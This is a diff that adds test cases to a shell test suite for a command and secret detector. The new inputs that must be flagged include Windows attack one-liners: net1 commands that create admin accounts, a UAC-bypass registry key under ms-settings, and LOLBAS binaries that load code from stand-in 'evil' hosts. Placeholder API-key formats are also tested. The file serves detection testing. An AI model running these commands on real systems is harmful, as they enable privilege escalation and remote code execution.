@@ -11671,6 +11671,60 @@ check "url: cydia flagged" "$(./hlse_core 'cydia://evil' | head -1 | grep -c 'LO
     && check "secret FP guard: ssws prose clean" "0" "0" \
     || check "secret FP guard: ssws prose clean" "0" "1"
 
+# ── cycle-224: net1 evasion + UAC-bypass/TAEF LOLBAS + secrets wave-7 ─
+for c in \
+    'net1 user hack P@ss /add' \
+    'net1 localgroup administrators hack /add' \
+    'net1 share c$=c:\' \
+    'net1 use \\evil.com\share' \
+    'net.exe user hack /add' \
+    'reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /d x' \
+    'runscripthelper.exe surfacecheck \\evil\share' \
+    'te.exe evil.test.dll' \
+    'presentationhost.exe http://evil/x.xbap' \
+    'presentationhost.exe \\evil\x.xbap' \
+    'replace.exe evil.exe c:\windows\system32'; do
+    ./hlse_core paste "$c" 2>&1 | grep -qE 'ALERT|BLOCK|ISOLATE' \
+        && check "paste: $c flagged" "0" "0" \
+        || check "paste: $c flagged" "0" "1"
+done
+for c in 'net1 user administrator' 'net1 share' 'net1 use' \
+         'the runscripthelper tool exists' 'te.exe' 'presentationhost' \
+         'presentationhost.exe' 'the replace command swaps files' \
+         'replace x c:\docs\mine' 'ms-settings is a protocol' \
+         'set ms-settings env var' 'reg query ms-settings'; do
+    ./hlse_core paste "$c" 2>&1 | grep -q '^OK' \
+        && check "paste FP guard: $c clean" "0" "0" \
+        || check "paste FP guard: $c clean" "0" "1"
+done
+
+for t in \
+    'k: sgp_Notes_abcdefghijklmnopqrstuvwxyz123456' \
+    'k: re_abc123def456ghi789jkl012mno345' \
+    'k: dbtc.abcdefghijklmnopqrstuvwxyz1234567890' \
+    'k: tr_dev_abc123def456ghi789jkl01' \
+    'k: tr_stg_abc123def456ghi789jkl01' \
+    'k: tr_prod_abc123def456ghi789jkl01' \
+    'k: hex_abc123def456ghi789jkl012' \
+    'k: akab-abcdef0123456789abcdef0123456789abcdef' \
+    'k: pub-c-abcdef12-3456-7890-abcd-ef1234567890' \
+    'k: sub-c-abcdef12-3456-7890-abcd-ef1234567890' \
+    'k: sec-c-abcdefghij1234567890abcdefghij1234567890' \
+    'k: hvl.abcdefghijklmnopqrstuvwxyz123456' \
+    'k: hcaik_abcdefghijklmnopqrstuvwxyz1234567890' \
+    'k: hcxik_abcdefghijklmnopqrstuvwxyz1234567890' \
+    'k: hcxmk_abcdefghijklmnopqrstuvwxyz1234567890'; do
+    ./hlse_core secret "$t" 2>&1 | grep -qE 'ALERT|BLOCK|ISOLATE' \
+        && check "secret: ${t:3:26} flagged" "0" "0" \
+        || check "secret: ${t:3:26} flagged" "0" "1"
+done
+for t in 'k: sgp-short' 'k: tr_build_x' 'k: hvl.shor' \
+         'the pub-c event happened' 'k: abc-def-123'; do
+    ./hlse_core secret "$t" 2>&1 | grep -q 'no credentials' \
+        && check "secret FP guard: ${t:0:30} clean" "0" "0" \
+        || check "secret FP guard: ${t:0:30} clean" "0" "1"
+done
+
 # ── cycle-223: registry persistence + LOLBAS wave-7 + secrets wave-6 ─
 for c in \
     'ieexec http://evil/app.exe' \
